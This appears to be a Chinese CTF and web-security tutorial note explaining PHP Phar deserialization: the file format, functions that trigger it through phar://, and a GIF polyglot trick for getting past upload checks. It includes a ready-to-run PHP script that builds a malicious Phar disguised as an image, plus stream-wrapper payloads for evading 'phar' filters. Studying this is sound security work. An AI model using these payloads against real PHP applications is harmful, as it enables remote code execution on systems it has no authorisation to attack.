---
date: 2026-10-15
title: "Phar反序列化：文件格式解析与触发隐藏面"
---
# 📦 Phar 隐式反序列化底层机制与全文件函数触发面

> **降维打击**：传统反序列化必须依赖后端显式调用 `unserialize($input)`。
> 而在 2018 年 Black Hat 安全大会上公布的 **Phar 反序列化技术**，彻底打破了这一认知：**后端代码中即使一行 `unserialize` 都没有，只要调用了任何常见的文件系统函数（如 `file_exists`、`is_file`、`md5_file`），攻击者就能静默触发完整的反序列化攻击！**

---

## 0. 基础前置认知与小白扫盲：什么是 Phar 归档与隐式反序列化？

> [!NOTE] 模块前置语言与工具清单
> - **前置通关必备**：零基础读者强烈建议先通读全局导航 **[[01-零基础入门前置指南与黑话工具字典]]**，掌握安全法律红线、终端命令行、HTTP 报文骨架与黑话字典！
> - **环境依赖**：具备基础 Web 浏览器（Chrome/Firefox）抓包认知或轻量 Python 脚本执行能力。


### 1. 为什么无需 `unserialize()` 就能触发反序列化？
* 传统的 PHP 反序列化漏洞，必须要求后台源码中显式写出了 `unserialize($_GET['data'])`。但在现代安全开发中，几乎没人会直接写出这种低级代码。
* **Phar 反序列化的神级突破**：
  * Phar（PHP Archive）是 PHP 官方设计的一种把整个项目所有文件打包成一个单文件的归档格式。
  * Phar 文件由四部分组成：存根（Stub）、清单说明（Manifest）、文件内容、签名。
  * **致命机制**：在清单说明（Manifest）区域中，Phar 允许存储开发者自定义的元数据（Meta-data），并且**这个 Meta-data 是以 PHP 序列化形式完整保存在文件二进制里的！**
  * **内核触发点**：当 PHP 内核遇到以 `phar://` 伪协议打开任何文件时，底层解析函数为了读取压缩包信息，会**无条件自动对 Meta-data 执行 `unserialize()`！**

---

### 2. 恐怖的触发面：几乎所有底层文件系统函数全军覆没
只要网站代码允许用户控制某个文件路径，哪怕代码里仅仅只是写了一个判断文件是否存在的无害函数：
* `file_exists('phar://evil.phar/test')`
* `is_dir(...)` / `is_file(...)`
* `filesize(...)` / `file_get_contents(...)`
* `md5_file(...)` / `sha1_file(...)`
只要在路径前加上 `phar://` 伪协议前缀，PHP 就会自动反序列化其中的恶意对象，瞬间激活深藏在系统内部的 POP 调用链！

---

## 一、Phar 归档文件的四大底层结构剖析

Phar（PHP Archive）类似于 Java 的 JAR 包，是将多个 PHP 源码及资源打包为单一文件的技术。其底层二进制由 4 部分严格构成：

```text
┌─────────────────────────────────────────────────────────────┐
│ 1. Stub 存根区: 必须以 "__HALT_COMPILER(); ?>" 结尾          │
├─────────────────────────────────────────────────────────────┤
│ 2. Manifest 清单区: 包含文件名、属性、以及 【Metadata (元数据)】 │
├─────────────────────────────────────────────────────────────┤
│ 3. File Contents 压缩内容区: 实际被打包的文件内容            │
├─────────────────────────────────────────────────────────────┤
│ 4. Signature 校验签名区: SHA1 / MD5 / SHA256 签名 (尾部标志) │
└─────────────────────────────────────────────────────────────┘
```

> [!IMPORTANT]
> **漏洞核心成因（Fatal Design）**：
> 在第 2 部分 Manifest 中，Phar 允许开发者通过 `setMetadata()` 为归档文件附加自定义元数据。
> **PHP 内部实现直接使用原生的 `serialize()` 将用户对象序列化后写入 Manifest！**
> 当任何文件操作函数通过 `phar://` 伪协议读取这个文件时，PHP 内核在解析清单阶段会**强制自动调用内部反序列化器还原该对象**，瞬间引爆 `__destruct()`、`__wakeup()` 等魔术方法！

---

## 二、二十余种隐藏触发函数矩阵（不止 `file_get_contents`）

只要用户能够控制文件路径参数，以下所有常见 PHP 原生函数均能通过 `phar://` 隐式触发反序列化：

| 函数类别 | 具体包含的原生函数列表 |
| :--- | :--- |
| **文件内容读取类** | `file_get_contents()`, `readfile()`, `file()`, `fopen()`, `file_put_contents()` |
| **文件状态判断类** | `file_exists()`, `is_file()`, `is_dir()`, `is_readable()`, `is_writable()`, `is_executable()` |
| **文件属性探测类** | `filesize()`, `filemtime()`, `filectime()`, `fileatime()`, `stat()`, `lstat()` |
| **哈希与图像计算类** | `md5_file()`, `sha1_file()`, `getimagesize()`, `exif_read_data()`, `hash_file()` |
| **文件操作与清理类** | `unlink()`, `copy()`, `rename()`, `touch()`, `rmdir()` |
| **数据库外带类** | MySQL `LOAD DATA LOCAL INFILE 'phar://...'` |

---

## 三、文件上传防御绕过：伪造成合法图片（Polyglot 技巧）

在实际渗透和 CTF 场景中，服务器通常只允许上传图片（如 `.gif`、`.jpg`、`.png`），且会严格校验**文件幻数头（Magic Bytes）**。

### 1. 存根头（Stub）伪装黑魔法
* **底层规则**：PHP 引擎解析 Phar 时，唯一硬性要求是存根必须以 `__HALT_COMPILER(); ?>` 结束，**但在这一句之前，可以填充任意数量的任意字节！**
* **伪造手段**：在 Stub 最前端强行插入 `GIF89a` 文件头：
```php
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");
```
* **后缀伪装**：直接将生成的 `exp.phar` 重命名为 `exp.gif` 或 `exp.png`。
* **效果**：系统通过 `getimagesize()` 检测完全判定为合法 GIF 图片，完美绕过所有图片校验上传！而后续使用 `phar://path/exp.gif` 读取时，PHP 会自动识别其内部的真实 Phar 结构并解构反序列化。

---

## 四、工业级武器化脚本：自动化生成图片木马 Phar

> ⚠️ **前置注意**：在本地运行此生成脚本前，必须在 `php.ini` 中设置 `phar.readonly = 0`（允许本地写入生成 Phar）。

```php
<?php
// 本地生成恶意伪造图片 Phar 文件的脚本：build_phar.php

// 1. 定义漏洞目标环境中的 POP 链对象结构
class VulnGadget {
    public $cmd;
    public function __construct($cmd) {
        $this->cmd = $cmd;
    }
}

// 2. 初始化待注入的恶意对象
$vuln_obj = new VulnGadget("cat /flag");

// 3. 创建 Phar 归档对象并指定临时文件名
$phar_filename = "payload.phar";
if (file_exists($phar_filename)) {
    unlink($phar_filename);
}

$phar = new Phar($phar_filename);
$phar->startBuffering();

// 4. 【关键步骤】：伪造 GIF89a 图片头并嵌入合法存根
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");

// 5. 【漏洞触发核心】：将待利用的对象存入 Metadata
$phar->setMetadata($vuln_obj);

// 6. 添加任意一个内部虚拟小文件（满足结构完整性）
$phar->addFromString("info.txt", "phar_internal_content");

// 7. 停止缓冲并生成哈希签名
$phar->stopBuffering();

// 8. 自动改名为合法图片后缀
rename($phar_filename, "evil_avatar.gif");
echo "[+] 恶意图片木马生成成功: evil_avatar.gif\n";
```

---

## 五、协议级高级绕过（当 `phar://` 协议头被过滤时）

若后端对输入路径做了 `if(preg_match("/phar/i", $path))` 黑名单检测，如何绕过？

### 1. 压缩解压伪协议流嵌套
利用 PHP 内置的流包装器（Stream Wrappers）对请求路径进行多层封装解析：
```text
compress.bzip2://phar:///var/www/html/uploads/evil.gif/info.txt
compress.zlib://phar:///var/www/html/uploads/evil.gif/info.txt
```

### 2. Base64 编码流嵌套
```text
php://filter/read=convert.base64-encode/resource=phar:///var/www/html/uploads/evil.gif
```
* **机理**：底层流管道在建立阶段即会解析内部嵌套的底层目标资源，在过滤逻辑未充分展开时，直接深入触碰 Phar 文件解压，进而触发反序列化。

---

## 🔗 相关双向链接
- 上级模块：[[07-反序列化漏洞深度专精]]
- 前置基础：[[原生类利用：Error, Exception, SoapClient, SimpleXMLElement]]
- 跨语言跃迁：[[Java原生序列化底层字节码与readObject机制]]
- 知识地图：[[00-Web安全与CTF知识地图总览]]
